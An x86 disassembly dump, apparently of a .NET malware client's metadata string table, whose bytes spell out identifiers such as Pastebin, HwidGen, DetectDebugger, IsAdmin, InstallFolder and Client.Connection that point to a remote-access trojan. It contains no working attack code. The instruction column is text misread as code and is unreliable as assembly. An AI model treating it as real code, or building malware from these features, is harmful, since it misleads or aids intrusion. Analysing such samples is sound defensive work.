  408766:	00 57 72             	add    %dl,0x72(%edi)
  408769:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  408770:	00 
  408771:	53                   	push   %ebx
  408772:	65 74 41             	gs je  0x4087b6
  408775:	73 4e                	jae    0x4087c5
  408777:	75 6c                	jne    0x4087e5
  408779:	6c                   	insb   (%dx),%es:(%edi)
  40877a:	00 4d 75             	add    %cl,0x75(%ebp)
  40877d:	74 65                	je     0x4087e4
  40877f:	78 43                	js     0x4087c4
  408781:	6f                   	outsl  %ds:(%esi),(%dx)
  408782:	6e                   	outsb  %ds:(%esi),(%dx)
  408783:	74 72                	je     0x4087f7
  408785:	6f                   	outsl  %ds:(%esi),(%dx)
  408786:	6c                   	insb   (%dx),%es:(%edi)
  408787:	00 45 6e             	add    %al,0x6e(%ebp)
  40878a:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40878d:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  408791:	72 65                	jb     0x4087f8
  408793:	61                   	popa
  408794:	6d                   	insl   (%dx),%es:(%edi)
  408795:	00 46 69             	add    %al,0x69(%esi)
  408798:	6c                   	insb   (%dx),%es:(%edi)
  408799:	65 53                	gs push %ebx
  40879b:	74 72                	je     0x40880f
  40879d:	65 61                	gs popa
  40879f:	6d                   	insl   (%dx),%es:(%edi)
  4087a0:	00 4e 65             	add    %cl,0x65(%esi)
  4087a3:	74 77                	je     0x40881c
  4087a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4087a6:	72 6b                	jb     0x408813
  4087a8:	53                   	push   %ebx
  4087a9:	74 72                	je     0x40881d
  4087ab:	65 61                	gs popa
  4087ad:	6d                   	insl   (%dx),%es:(%edi)
  4087ae:	00 53 73             	add    %dl,0x73(%ebx)
  4087b1:	6c                   	insb   (%dx),%es:(%edi)
  4087b2:	53                   	push   %ebx
  4087b3:	74 72                	je     0x408827
  4087b5:	65 61                	gs popa
  4087b7:	6d                   	insl   (%dx),%es:(%edi)
  4087b8:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4087bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4087bd:	64 65 46             	fs gs inc %esi
  4087c0:	72 6f                	jb     0x408831
  4087c2:	6d                   	insl   (%dx),%es:(%edi)
  4087c3:	53                   	push   %ebx
  4087c4:	74 72                	je     0x408838
  4087c6:	65 61                	gs popa
  4087c8:	6d                   	insl   (%dx),%es:(%edi)
  4087c9:	00 43 72             	add    %al,0x72(%ebx)
  4087cc:	79 70                	jns    0x40883e
  4087ce:	74 6f                	je     0x40883f
  4087d0:	53                   	push   %ebx
  4087d1:	74 72                	je     0x408845
  4087d3:	65 61                	gs popa
  4087d5:	6d                   	insl   (%dx),%es:(%edi)
  4087d6:	00 47 5a             	add    %al,0x5a(%edi)
  4087d9:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4087e0:	6d                   	insl   (%dx),%es:(%edi)
  4087e1:	00 4d 65             	add    %cl,0x65(%ebp)
  4087e4:	6d                   	insl   (%dx),%es:(%edi)
  4087e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e6:	72 79                	jb     0x408861
  4087e8:	53                   	push   %ebx
  4087e9:	74 72                	je     0x40885d
  4087eb:	65 61                	gs popa
  4087ed:	6d                   	insl   (%dx),%es:(%edi)
  4087ee:	00 50 72             	add    %dl,0x72(%eax)
  4087f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4087f2:	67 72 61             	addr16 jb 0x408856
  4087f5:	6d                   	insl   (%dx),%es:(%edi)
  4087f6:	00 67 65             	add    %ah,0x65(%edi)
  4087f9:	74 5f                	je     0x40885a
  4087fb:	49                   	dec    %ecx
  4087fc:	74 65                	je     0x408863
  4087fe:	6d                   	insl   (%dx),%es:(%edi)
  4087ff:	00 67 65             	add    %ah,0x65(%edi)
  408802:	74 5f                	je     0x408863
  408804:	49                   	dec    %ecx
  408805:	73 36                	jae    0x40883d
  408807:	34 42                	xor    $0x42,%al
  408809:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408810:	74 
  408811:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  408818:	65 6d                	gs insl (%dx),%es:(%edi)
  40881a:	00 43 6c             	add    %al,0x6c(%ebx)
  40881d:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  408824:	67 6f                	outsl  %ds:(%si),(%dx)
  408826:	72 69                	jb     0x408891
  408828:	74 68                	je     0x408892
  40882a:	6d                   	insl   (%dx),%es:(%edi)
  40882b:	00 53 79             	add    %dl,0x79(%ebx)
  40882e:	6d                   	insl   (%dx),%es:(%edi)
  40882f:	6d                   	insl   (%dx),%es:(%edi)
  408830:	65 74 72             	gs je  0x4088a5
  408833:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40883a:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  408841:	79 
  408842:	6d                   	insl   (%dx),%es:(%edi)
  408843:	6d                   	insl   (%dx),%es:(%edi)
  408844:	65 74 72             	gs je  0x4088b9
  408847:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40884e:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  408855:	73 
  408856:	68 41 6c 67 6f       	push   $0x6f676c41
  40885b:	72 69                	jb     0x4088c6
  40885d:	74 68                	je     0x4088c7
  40885f:	6d                   	insl   (%dx),%es:(%edi)
  408860:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  408864:	6d                   	insl   (%dx),%es:(%edi)
  408865:	00 52 61             	add    %dl,0x61(%edx)
  408868:	6e                   	outsb  %ds:(%esi),(%dx)
  408869:	64 6f                	outsl  %fs:(%esi),(%dx)
  40886b:	6d                   	insl   (%dx),%es:(%edi)
  40886c:	00 49 43             	add    %cl,0x43(%ecx)
  40886f:	72 79                	jb     0x4088ea
  408871:	70 74                	jo     0x4088e7
  408873:	6f                   	outsl  %ds:(%esi),(%dx)
  408874:	54                   	push   %esp
  408875:	72 61                	jb     0x4088d8
  408877:	6e                   	outsb  %ds:(%esi),(%dx)
  408878:	73 66                	jae    0x4088e0
  40887a:	6f                   	outsl  %ds:(%esi),(%dx)
  40887b:	72 6d                	jb     0x4088ea
  40887d:	00 4d 73             	add    %cl,0x73(%ebp)
  408880:	67 50                	addr16 push %eax
  408882:	61                   	popa
  408883:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  408886:	6e                   	outsb  %ds:(%esi),(%dx)
  408887:	75 6d                	jne    0x4088f6
  408889:	00 57 72             	add    %dl,0x72(%edi)
  40888c:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  408893:	65 
  408894:	61                   	popa
  408895:	6e                   	outsb  %ds:(%esi),(%dx)
  408896:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  40889a:	6f                   	outsl  %ds:(%esi),(%dx)
  40889b:	6f                   	outsl  %ds:(%esi),(%dx)
  40889c:	6c                   	insb   (%dx),%es:(%edi)
  40889d:	65 61                	gs popa
  40889f:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a0:	00 53 65             	add    %dl,0x65(%ebx)
  4088a3:	74 41                	je     0x4088e6
  4088a5:	73 42                	jae    0x4088e9
  4088a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a9:	6c                   	insb   (%dx),%es:(%edi)
  4088aa:	65 61                	gs popa
  4088ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4088ad:	00 48 77             	add    %cl,0x77(%eax)
  4088b0:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  4088b7:	65 
  4088b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b9:	00 63 68             	add    %ah,0x68(%ebx)
  4088bc:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  4088c3:	4d 
  4088c4:	61                   	popa
  4088c5:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4088cc:	43                   	inc    %ebx
  4088cd:	68 61 69 6e 00       	push   $0x6e6961
  4088d2:	63 68 61             	arpl   %ebp,0x61(%eax)
  4088d5:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4088dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4088dd:	6d                   	insl   (%dx),%es:(%edi)
  4088de:	61                   	popa
  4088df:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088e6:	43                   	inc    %ebx
  4088e7:	75 72                	jne    0x40895b
  4088e9:	72 65                	jb     0x408950
  4088eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4088ec:	74 44                	je     0x408932
  4088ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4088ef:	6d                   	insl   (%dx),%es:(%edi)
  4088f0:	61                   	popa
  4088f1:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  4088f8:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  4088fc:	00 49 73             	add    %cl,0x73(%ecx)
  4088ff:	41                   	inc    %ecx
  408900:	64 6d                	fs insl (%dx),%es:(%edi)
  408902:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  408909:	00 47 65             	add    %al,0x65(%edi)
  40890c:	74 46                	je     0x408954
  40890e:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  408915:	57 
  408916:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  40891d:	78 
  40891e:	74 65                	je     0x408985
  408920:	6e                   	outsb  %ds:(%esi),(%dx)
  408921:	73 69                	jae    0x40898c
  408923:	6f                   	outsl  %ds:(%esi),(%dx)
  408924:	6e                   	outsb  %ds:(%esi),(%dx)
  408925:	00 67 65             	add    %ah,0x65(%edi)
  408928:	74 5f                	je     0x408989
  40892a:	4f                   	dec    %edi
  40892b:	53                   	push   %ebx
  40892c:	56                   	push   %esi
  40892d:	65 72 73             	gs jb  0x4089a3
  408930:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408937:	74 65                	je     0x40899e
  408939:	6d                   	insl   (%dx),%es:(%edi)
  40893a:	2e 49                	cs dec %ecx
  40893c:	4f                   	dec    %edi
  40893d:	2e 43                	cs inc %ebx
  40893f:	6f                   	outsl  %ds:(%esi),(%dx)
  408940:	6d                   	insl   (%dx),%es:(%edi)
  408941:	70 72                	jo     0x4089b5
  408943:	65 73 73             	gs jae 0x4089b9
  408946:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  40894d:	6c                   	insb   (%dx),%es:(%edi)
  40894e:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408955:	00 53 79             	add    %dl,0x79(%ebx)
  408958:	73 74                	jae    0x4089ce
  40895a:	65 6d                	gs insl (%dx),%es:(%edi)
  40895c:	2e 53                	cs push %ebx
  40895e:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408962:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  408969:	68 
  40896a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40896c:	74 69                	je     0x4089d7
  40896e:	63 61 74             	arpl   %esp,0x74(%ecx)
  408971:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408978:	74 65                	je     0x4089df
  40897a:	6d                   	insl   (%dx),%es:(%edi)
  40897b:	2e 52                	cs push %edx
  40897d:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  408980:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408985:	6e                   	outsb  %ds:(%esi),(%dx)
  408986:	00 58 35             	add    %bl,0x35(%eax)
  408989:	30 39                	xor    %bh,(%ecx)
  40898b:	43                   	inc    %ebx
  40898c:	65 72 74             	gs jb  0x408a03
  40898f:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408996:	43                   	inc    %ebx
  408997:	6f                   	outsl  %ds:(%esi),(%dx)
  408998:	6c                   	insb   (%dx),%es:(%edi)
  408999:	6c                   	insb   (%dx),%es:(%edi)
  40899a:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40899f:	6e                   	outsb  %ds:(%esi),(%dx)
  4089a0:	00 4d 61             	add    %cl,0x61(%ebp)
  4089a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4089a4:	61                   	popa
  4089a5:	67 65 6d             	gs insl (%dx),%es:(%di)
  4089a8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089aa:	74 4f                	je     0x4089fb
  4089ac:	62 6a 65             	bound  %ebp,0x65(%edx)
  4089af:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4089b3:	6c                   	insb   (%dx),%es:(%edi)
  4089b4:	6c                   	insb   (%dx),%es:(%edi)
  4089b5:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4089bb:	00 43 6c             	add    %al,0x6c(%ebx)
  4089be:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  4089c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4089cd:	00 73 65             	add    %dh,0x65(%ebx)
  4089d0:	74 5f                	je     0x408a31
  4089d2:	50                   	push   %eax
  4089d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d4:	73 69                	jae    0x408a3f
  4089d6:	74 69                	je     0x408a41
  4089d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4089da:	00 70 6f             	add    %dh,0x6f(%eax)
  4089dd:	73 69                	jae    0x408a48
  4089df:	74 69                	je     0x408a4a
  4089e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4089e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4089e3:	00 43 72             	add    %al,0x72(%ebx)
  4089e6:	79 70                	jns    0x408a58
  4089e8:	74 6f                	je     0x408a59
  4089ea:	67 72 61             	addr16 jb 0x408a4e
  4089ed:	70 68                	jo     0x408a57
  4089ef:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4089f6:	74 69                	je     0x408a61
  4089f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4089f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4089fa:	00 41 72             	add    %al,0x72(%ecx)
  4089fd:	67 75 6d             	addr16 jne 0x408a6d
  408a00:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a02:	74 4e                	je     0x408a52
  408a04:	75 6c                	jne    0x408a72
  408a06:	6c                   	insb   (%dx),%es:(%edi)
  408a07:	45                   	inc    %ebp
  408a08:	78 63                	js     0x408a6d
  408a0a:	65 70 74             	gs jo  0x408a81
  408a0d:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408a14:	75 6d                	jne    0x408a83
  408a16:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a18:	74 45                	je     0x408a5f
  408a1a:	78 63                	js     0x408a7f
  408a1c:	65 70 74             	gs jo  0x408a93
  408a1f:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408a26:	6e                   	outsb  %ds:(%esi),(%dx)
  408a27:	6f                   	outsl  %ds:(%esi),(%dx)
  408a28:	77 6e                	ja     0x408a98
  408a2a:	00 49 6d             	add    %cl,0x6d(%ecx)
  408a2d:	61                   	popa
  408a2e:	67 65 43             	addr16 gs inc %ebx
  408a31:	6f                   	outsl  %ds:(%esi),(%dx)
  408a32:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408a37:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a39:	00 53 65             	add    %dl,0x65(%ebx)
  408a3c:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3d:	64 49                	fs dec %ecx
  408a3f:	6e                   	outsb  %ds:(%esi),(%dx)
  408a40:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a42:	00 46 69             	add    %al,0x69(%esi)
  408a45:	6c                   	insb   (%dx),%es:(%edi)
  408a46:	65 49                	gs dec %ecx
  408a48:	6e                   	outsb  %ds:(%esi),(%dx)
  408a49:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a4b:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408a4f:	76 65                	jbe    0x408ab6
  408a51:	49                   	dec    %ecx
  408a52:	6e                   	outsb  %ds:(%esi),(%dx)
  408a53:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a55:	00 46 69             	add    %al,0x69(%esi)
  408a58:	6c                   	insb   (%dx),%es:(%edi)
  408a59:	65 53                	gs push %ebx
  408a5b:	79 73                	jns    0x408ad0
  408a5d:	74 65                	je     0x408ac4
  408a5f:	6d                   	insl   (%dx),%es:(%edi)
  408a60:	49                   	dec    %ecx
  408a61:	6e                   	outsb  %ds:(%esi),(%dx)
  408a62:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a64:	00 43 6f             	add    %al,0x6f(%ebx)
  408a67:	6d                   	insl   (%dx),%es:(%edi)
  408a68:	70 75                	jo     0x408adf
  408a6a:	74 65                	je     0x408ad1
  408a6c:	72 49                	jb     0x408ab7
  408a6e:	6e                   	outsb  %ds:(%esi),(%dx)
  408a6f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a71:	00 43 53             	add    %al,0x53(%ebx)
  408a74:	68 61 72 70 41       	push   $0x41707261
  408a79:	72 67                	jb     0x408ae2
  408a7b:	75 6d                	jne    0x408aea
  408a7d:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a7f:	74 49                	je     0x408aca
  408a81:	6e                   	outsb  %ds:(%esi),(%dx)
  408a82:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a84:	00 50 72             	add    %dl,0x72(%eax)
  408a87:	6f                   	outsl  %ds:(%esi),(%dx)
  408a88:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a8b:	73 53                	jae    0x408ae0
  408a8d:	74 61                	je     0x408af0
  408a8f:	72 74                	jb     0x408b05
  408a91:	49                   	dec    %ecx
  408a92:	6e                   	outsb  %ds:(%esi),(%dx)
  408a93:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a95:	00 57 72             	add    %dl,0x72(%edi)
  408a98:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  408a9f:	50 
  408aa0:	72 65                	jb     0x408b07
  408aa2:	76 65                	jbe    0x408b09
  408aa4:	6e                   	outsb  %ds:(%esi),(%dx)
  408aa5:	74 53                	je     0x408afa
  408aa7:	6c                   	insb   (%dx),%es:(%edi)
  408aa8:	65 65 70 00          	gs gs jo 0x408aac
  408aac:	5a                   	pop    %edx
  408aad:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408ab4:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ab6:	74 41                	je     0x408af9
  408ab8:	70 70                	jo     0x408b2a
  408aba:	00 4d 69             	add    %cl,0x69(%ebp)
  408abd:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408ac0:	73 6f                	jae    0x408b31
  408ac2:	66 74 2e             	data16 je 0x408af3
  408ac5:	43                   	inc    %ebx
  408ac6:	53                   	push   %ebx
  408ac7:	68 61 72 70 00       	push   $0x707261
  408acc:	47                   	inc    %edi
  408acd:	72 6f                	jb     0x408b3e
  408acf:	75 70                	jne    0x408b41
  408ad1:	00 4e 6f             	add    %cl,0x6f(%esi)
  408ad4:	72 6d                	jb     0x408b43
  408ad6:	61                   	popa
  408ad7:	6c                   	insb   (%dx),%es:(%edi)
  408ad8:	53                   	push   %ebx
  408ad9:	74 61                	je     0x408b3c
  408adb:	72 74                	jb     0x408b51
  408add:	75 70                	jne    0x408b4f
  408adf:	00 53 79             	add    %dl,0x79(%ebx)
  408ae2:	73 74                	jae    0x408b58
  408ae4:	65 6d                	gs insl (%dx),%es:(%edi)
  408ae6:	2e 4c                	cs dec %esp
  408ae8:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  408aef:	61                   	popa
  408af0:	72 00                	jb     0x408af2
  408af2:	43                   	inc    %ebx
  408af3:	68 61 72 00 49       	push   $0x49007261
  408af8:	6e                   	outsb  %ds:(%esi),(%dx)
  408af9:	76 6f                	jbe    0x408b6a
  408afb:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408aff:	6d                   	insl   (%dx),%es:(%edi)
  408b00:	62 65 72             	bound  %esp,0x72(%ebp)
  408b03:	00 4d 44             	add    %cl,0x44(%ebp)
  408b06:	35 43 72 79 70       	xor    $0x70797243,%eax
  408b0b:	74 6f                	je     0x408b7c
  408b0d:	53                   	push   %ebx
  408b0e:	65 72 76             	gs jb  0x408b87
  408b11:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b18:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408b1f:	41 
  408b20:	43                   	inc    %ebx
  408b21:	72 79                	jb     0x408b9c
  408b23:	70 74                	jo     0x408b99
  408b25:	6f                   	outsl  %ds:(%esi),(%dx)
  408b26:	53                   	push   %ebx
  408b27:	65 72 76             	gs jb  0x408ba0
  408b2a:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b31:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  408b38:	73 
  408b39:	43                   	inc    %ebx
  408b3a:	72 79                	jb     0x408bb5
  408b3c:	70 74                	jo     0x408bb2
  408b3e:	6f                   	outsl  %ds:(%esi),(%dx)
  408b3f:	53                   	push   %ebx
  408b40:	65 72 76             	gs jb  0x408bb9
  408b43:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b4a:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  408b51:	72 
  408b52:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  408b59:	64 65 72 00          	fs gs jb 0x408b5d
  408b5d:	49                   	dec    %ecx
  408b5e:	6e                   	outsb  %ds:(%esi),(%dx)
  408b5f:	73 74                	jae    0x408bd5
  408b61:	61                   	popa
  408b62:	6c                   	insb   (%dx),%es:(%edi)
  408b63:	6c                   	insb   (%dx),%es:(%edi)
  408b64:	46                   	inc    %esi
  408b65:	6f                   	outsl  %ds:(%esi),(%dx)
  408b66:	6c                   	insb   (%dx),%es:(%edi)
  408b67:	64 65 72 00          	fs gs jb 0x408b6b
  408b6b:	49                   	dec    %ecx
  408b6c:	64 53                	fs push %ebx
  408b6e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b70:	64 65 72 00          	fs gs jb 0x408b74
  408b74:	73 65                	jae    0x408bdb
  408b76:	6e                   	outsb  %ds:(%esi),(%dx)
  408b77:	64 65 72 00          	fs gs jb 0x408b7b
  408b7b:	4d                   	dec    %ebp
  408b7c:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408b83:	74 2e                	je     0x408bb3
  408b85:	43                   	inc    %ebx
  408b86:	53                   	push   %ebx
  408b87:	68 61 72 70 2e       	push   $0x2e707261
  408b8c:	52                   	push   %edx
  408b8d:	75 6e                	jne    0x408bfd
  408b8f:	74 69                	je     0x408bfa
  408b91:	6d                   	insl   (%dx),%es:(%edi)
  408b92:	65 42                	gs inc %edx
  408b94:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408b9b:	61                   	popa
  408b9c:	6c                   	insb   (%dx),%es:(%edi)
  408b9d:	6c                   	insb   (%dx),%es:(%edi)
  408b9e:	53                   	push   %ebx
  408b9f:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  408ba6:	65 
  408ba7:	72 00                	jb     0x408ba9
  408ba9:	47                   	inc    %edi
  408baa:	65 74 45             	gs je  0x408bf2
  408bad:	6e                   	outsb  %ds:(%esi),(%dx)
  408bae:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408bb1:	65 72 00             	gs jb  0x408bb4
  408bb4:	67 65 74 5f          	addr16 gs je 0x408c17
  408bb8:	42                   	inc    %edx
  408bb9:	75 66                	jne    0x408c21
  408bbb:	66 65 72 00          	data16 gs jb 0x408bbf
  408bbf:	73 65                	jae    0x408c26
  408bc1:	74 5f                	je     0x408c22
  408bc3:	42                   	inc    %edx
  408bc4:	75 66                	jne    0x408c2c
  408bc6:	66 65 72 00          	data16 gs jb 0x408bca
  408bca:	57                   	push   %edi
  408bcb:	72 69                	jb     0x408c36
  408bcd:	74 65                	je     0x408c34
  408bcf:	49                   	dec    %ecx
  408bd0:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd1:	74 65                	je     0x408c38
  408bd3:	67 65 72 00          	addr16 gs jb 0x408bd7
  408bd7:	67 65 74 5f          	addr16 gs je 0x408c3a
  408bdb:	41                   	inc    %ecx
  408bdc:	73 49                	jae    0x408c27
  408bde:	6e                   	outsb  %ds:(%esi),(%dx)
  408bdf:	74 65                	je     0x408c46
  408be1:	67 65 72 00          	addr16 gs jb 0x408be5
  408be5:	73 65                	jae    0x408c4c
  408be7:	74 5f                	je     0x408c48
  408be9:	41                   	inc    %ecx
  408bea:	73 49                	jae    0x408c35
  408bec:	6e                   	outsb  %ds:(%esi),(%dx)
  408bed:	74 65                	je     0x408c54
  408bef:	67 65 72 00          	addr16 gs jb 0x408bf3
  408bf3:	47                   	inc    %edi
  408bf4:	65 74 41             	gs je  0x408c38
  408bf7:	73 49                	jae    0x408c42
  408bf9:	6e                   	outsb  %ds:(%esi),(%dx)
  408bfa:	74 65                	je     0x408c61
  408bfc:	67 65 72 00          	addr16 gs jb 0x408c00
  408c00:	53                   	push   %ebx
  408c01:	65 74 41             	gs je  0x408c45
  408c04:	73 49                	jae    0x408c4f
  408c06:	6e                   	outsb  %ds:(%esi),(%dx)
  408c07:	74 65                	je     0x408c6e
  408c09:	67 65 72 00          	addr16 gs jb 0x408c0d
  408c0d:	44                   	inc    %esp
  408c0e:	65 74 65             	gs je  0x408c76
  408c11:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  408c15:	62 75 67             	bound  %esi,0x67(%ebp)
  408c18:	67 65 72 00          	addr16 gs jb 0x408c1c
  408c1c:	4d                   	dec    %ebp
  408c1d:	61                   	popa
  408c1e:	6e                   	outsb  %ds:(%esi),(%dx)
  408c1f:	61                   	popa
  408c20:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c23:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c25:	74 4f                	je     0x408c76
  408c27:	62 6a 65             	bound  %ebp,0x65(%edx)
  408c2a:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408c2e:	61                   	popa
  408c2f:	72 63                	jb     0x408c94
  408c31:	68 65 72 00 53       	push   $0x53007265
  408c36:	65 73 73             	gs jae 0x408cac
  408c39:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c40:	6e                   	outsb  %ds:(%esi),(%dx)
  408c41:	67 45                	addr16 inc %ebp
  408c43:	76 65                	jbe    0x408caa
  408c45:	6e                   	outsb  %ds:(%esi),(%dx)
  408c46:	74 48                	je     0x408c90
  408c48:	61                   	popa
  408c49:	6e                   	outsb  %ds:(%esi),(%dx)
  408c4a:	64 6c                	fs insb (%dx),%es:(%edi)
  408c4c:	65 72 00             	gs jb  0x408c4f
  408c4f:	54                   	push   %esp
  408c50:	69 6d 65 72 00 6f 77 	imul   $0x776f0072,0x65(%ebp),%ebp
  408c57:	6e                   	outsb  %ds:(%esi),(%dx)
  408c58:	65 72 00             	gs jb  0x408c5b
  408c5b:	43                   	inc    %ebx
  408c5c:	6c                   	insb   (%dx),%es:(%edi)
  408c5d:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  408c64:	6c                   	insb   (%dx),%es:(%edi)
  408c65:	70 65                	jo     0x408ccc
  408c67:	72 00                	jb     0x408c69
  408c69:	54                   	push   %esp
  408c6a:	6f                   	outsl  %ds:(%esi),(%dx)
  408c6b:	55                   	push   %ebp
  408c6c:	70 70                	jo     0x408cde
  408c6e:	65 72 00             	gs jb  0x408c71
  408c71:	44                   	inc    %esp
  408c72:	65 74 65             	gs je  0x408cda
  408c75:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  408c79:	6e                   	outsb  %ds:(%esi),(%dx)
  408c7a:	75 66                	jne    0x408ce2
  408c7c:	61                   	popa
  408c7d:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408c81:	65 72 00             	gs jb  0x408c84
  408c84:	43                   	inc    %ebx
  408c85:	75 72                	jne    0x408cf9
  408c87:	72 65                	jb     0x408cee
  408c89:	6e                   	outsb  %ds:(%esi),(%dx)
  408c8a:	74 55                	je     0x408ce1
  408c8c:	73 65                	jae    0x408cf3
